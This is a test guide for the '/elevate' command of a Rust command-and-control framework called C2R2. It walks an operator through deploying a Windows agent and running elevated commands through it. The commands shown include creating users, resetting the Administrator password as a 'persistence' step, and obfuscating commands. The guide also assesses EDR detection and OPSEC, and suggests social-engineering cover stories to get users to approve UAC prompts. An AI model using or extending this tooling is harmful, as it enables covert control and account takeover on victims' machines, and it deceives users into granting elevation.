# Testing the /elevate Command

## Test Scenario Guide

This document provides step-by-step instructions for testing the new `/elevate` command functionality.

## Prerequisites

1. **Build the C2 Server:**
   ```bash
   cd c2r2-server
   cargo build --release
   ```

2. **Build the Agent:**
   ```bash
   cd agent
   cargo build --release --target x86_64-pc-windows-gnu
   ```

3. **Deploy Agent to Windows Test System:**
   - Copy `agent/target/x86_64-pc-windows-gnu/release/agent.exe` to a Windows machine
   - Ensure the Windows machine has PowerShell available (default on Windows 7+)

## Test Cases

### Test 1: Basic Privilege Check

**Objective:** Verify that /elevate triggers UAC and executes with elevated privileges

**Steps:**
1. Start C2 server:
   ```bash
   cd c2r2-server
   ./target/release/c2r2-server
   ```

2. Run agent on Windows target (as standard user)
   ```cmd
   agent.exe
   ```

3. From C2 server, list clients:
   ```
   C2R2> /list
   ```

4. Select the client:
   ```
   C2R2> /select 1
   ```

5. Check current privileges (should show "User"):
   ```
   C2R2 [1]> /cmd whoami /priv
   ```

6. Try elevated command:
   ```
   C2R2 [1]> /elevate whoami /priv
   ```

**Expected Result:**
- UAC prompt appears on Windows target
- User clicks "Yes"
- Output shows elevated privileges (e.g., SeDebugPrivilege enabled)
- Success message: "__INFO__:Comando elevado ejecutado exitosamente"

### Test 2: User Rejects UAC

**Objective:** Verify graceful handling when user rejects UAC prompt

**Steps:**
1. Execute elevated command:
   ```
   C2R2 [1]> /elevate net user
   ```

2. When UAC prompt appears, click "No" or wait for timeout

**Expected Result:**
- Error message: "__ERROR__:Error al elevar comando (¿Usuario rechazó UAC?)"
- No system changes made
- Server remains stable

### Test 3: Administrative Commands

**Objective:** Test commands that require admin privileges

**Steps:**
1. Try to add a user without elevation (should fail):
   ```
   C2R2 [1]> /cmd net user testuser Password123! /add
   ```

2. Try with elevation (should succeed with UAC approval):
   ```
   C2R2 [1]> /elevate net user testuser Password123! /add
   ```

3. Verify user was created:
   ```
   C2R2 [1]> /elevate net user testuser
   ```

4. Clean up:
   ```
   C2R2 [1]> /elevate net user testuser /delete
   ```

**Expected Result:**
- First command fails with "Access denied"
- Second command succeeds after UAC approval
- User is successfully created and deleted

### Test 4: PowerShell Commands

**Objective:** Verify elevated PowerShell execution

**Steps:**
1. Get local administrators without elevation:
   ```
   C2R2 [1]> /cmd powershell Get-LocalGroupMember Administrators
   ```

2. Get with elevation:
   ```
   C2R2 [1]> /elevate powershell Get-LocalGroupMember Administrators
   ```

**Expected Result:**
- Both should work if target has necessary permissions
- Elevated version may show additional members
- Output correctly captured and returned

### Test 5: Command Obfuscation

**Objective:** Verify ArgFuscator obfuscation is applied

**Steps:**
1. Enable debug mode in agent (build with dev features)
2. Execute elevated command:
   ```
   C2R2 [1]> /elevate whoami
   ```

3. Check agent debug output for obfuscation

**Expected Result:**
- Command is obfuscated before elevation
- Obfuscated command logged in debug output
- Command still executes correctly

### Test 6: Integration with Persistence

**Objective:** Establish admin-level persistence using elevation

**Steps:**
1. Check current privileges:
   ```
   C2R2 [1]> /cmd whoami /priv
   ```

2. Try WMI persistence without elevation (should fail):
   ```
   C2R2 [1]> /persist wmi
   ```

3. Establish persistence with elevation:
   ```
   C2R2 [1]> /elevate net user Administrator newTempPassword123!
   ```

**Expected Result:**
- Non-elevated WMI persistence fails
- Elevated commands succeed after UAC approval
- Demonstrates practical use case for /elevate

### Test 7: Output Capture

**Objective:** Verify output is correctly captured from elevated process

**Steps:**
1. Execute command with significant output:
   ```
   C2R2 [1]> /elevate ipconfig /all
   ```

2. Execute command with both stdout and stderr:
   ```
   C2R2 [1]> /elevate dir C:\Windows\System32\config
   ```

**Expected Result:**
- All output correctly captured and returned
- Both stdout and stderr visible
- Output formatted properly

### Test 8: Error Handling

**Objective:** Test error scenarios

**Steps:**
1. Invalid command:
   ```
   C2R2 [1]> /elevate invalidcommand123
   ```

2. Empty command:
   ```
   C2R2 [1]> /elevate
   ```

3. Command with special characters:
   ```
   C2R2 [1]> /elevate echo "Test & More" && whoami
   ```

**Expected Result:**
- Server shows usage message for empty command
- Invalid commands return error but don't crash
- Special characters handled correctly

## Security Testing

### Test 9: Detection by AV/EDR

**Objective:** Assess detectability of /elevate functionality

**Test Environment:**
- Windows with Windows Defender enabled
- Optional: Test with additional EDR solution

**Steps:**
1. Execute /elevate with Defender active
2. Check Windows Event Logs for UAC events
3. Monitor for EDR alerts

**Expected Observations:**
- UAC prompt is logged (Event ID 4688)
- PowerShell execution logged (Event ID 4104 if script block logging enabled)
- Defender may flag unusual PowerShell usage
- This is expected behavior - /elevate is not designed to be covert

### Test 10: OPSEC Considerations

**Objective:** Understand operational security implications

**Observations to Note:**
- UAC prompt appears on screen (cannot be hidden)
- PowerShell spawns elevated cmd.exe (visible in process tree)
- Temporary file created in %TEMP% (cleaned up automatically)
- Event logs capture elevation events
- Timing of UAC prompts may alert users

## Troubleshooting

### Issue: UAC Prompt Never Appears

**Possible Causes:**
- UAC disabled in Windows settings
- PowerShell execution policy blocking
- Agent running in service context without desktop access

**Solutions:**
- Verify UAC enabled: `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA`
- Check PowerShell policy: `Get-ExecutionPolicy`
- Ensure agent has desktop session access

### Issue: Command Executes but No Output

**Possible Causes:**
- Output file not created/accessible
- Command completed too quickly
- File system permissions

**Solutions:**
- Check %TEMP% permissions
- Add delays if needed
- Verify command actually produces output

### Issue: "Access Denied" Even with Elevation

**Possible Causes:**
- Command requires SYSTEM privileges (not just admin)
- Protected resources (e.g., TrustedInstaller owned files)
- Anti-tampering protections

**Solutions:**
- Use alternative approaches (service installation, scheduled tasks)
- Consider UAC is not sufficient for all operations
- May need to combine with other techniques

## Comparison: /cmd vs /elevate

| Aspect | /cmd | /elevate |
|--------|------|----------|
| Privileges | Current user | Administrator (with UAC approval) |
| User interaction | None | UAC prompt required |
| Stealth | High | Low (UAC visible) |
| Use case | Regular operations | Admin-only operations |
| Detection risk | Low | Medium-High (UAC logged) |

## Next Steps After Testing

1. **Document Results:** Note any unexpected behavior
2. **OPSEC Planning:** Consider when to use /elevate based on detection risk
3. **Integration:** Combine with other C2R2 features (/persist, /harvest, etc.)
4. **Social Engineering:** Develop cover stories for UAC prompts
5. **Alternative Methods:** Research target-specific LPE vulnerabilities for silent elevation

## References

- Windows UAC: https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/
- PowerShell Execution Policy: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy
- Windows Event Logging: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation
